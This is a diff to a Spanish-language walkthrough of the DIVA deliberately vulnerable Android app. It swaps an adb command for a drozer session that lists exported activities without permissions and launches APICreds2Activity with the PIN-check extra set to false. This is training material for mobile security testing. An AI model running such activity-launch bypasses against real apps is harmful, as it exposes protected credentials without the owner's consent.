@@ -134,11 +134,48 @@ if (!bcheck) {
 }
 ```
 
-Para pasar dicho valor podemos utilizar el siguiente comando:
+Vamos a investigar con **drozer**:
 
 ```bash
-adb shell am start jakhar.aseem.diva/.APICreds2Activity --ez chk_pin false
+adb forward tcp:31415 tcp:31415
+31415
+```
 
-Starting: Intent { act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=jakhar.aseem.diva/.APICreds2Activity }
+```bash
+drozer console connect
+Selecting 49d862176aaee32d (Xiaomi Mi Note 10 11)
+
+            ..                    ..:.
+           ..o..                  .r..
+            ..a..  . ....... .  ..nd
+              ro..idsnemesisand..pr
+              .otectorandroidsneme.
+           .,sisandprotectorandroids+.
+         ..nemesisandprotectorandroidsn:.
+        .emesisandprotectorandroidsnemes..
+      ..isandp,..,rotecyayandro,..,idsnem.
+      .isisandp..rotectorandroid..snemisis.
+      ,andprotectorandroidsnemisisandprotec.
+     .torandroidsnemesisandprotectorandroid.
+     .snemisisandprotectorandroidsnemesisan:
+     .dprotectorandroidsnemesisandprotector.
+
+drozer Console (v3.1.0)
+dz> run app.activity.info -a jakhar.aseem.diva
+Attempting to run shell module
+Package: jakhar.aseem.diva
+  jakhar.aseem.diva.MainActivity
+    Permission: null
+  jakhar.aseem.diva.APICredsActivity
+    Permission: null
+  jakhar.aseem.diva.APICreds2Activity
+    Permission: null
+```
+
+Para pasar dicho valor podemos utilizar el siguiente comando en drozer:
+
+```bash
+dz> run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICreds2Activity --extra boolean check_pin false
+Attempting to run shell module
 ```
 
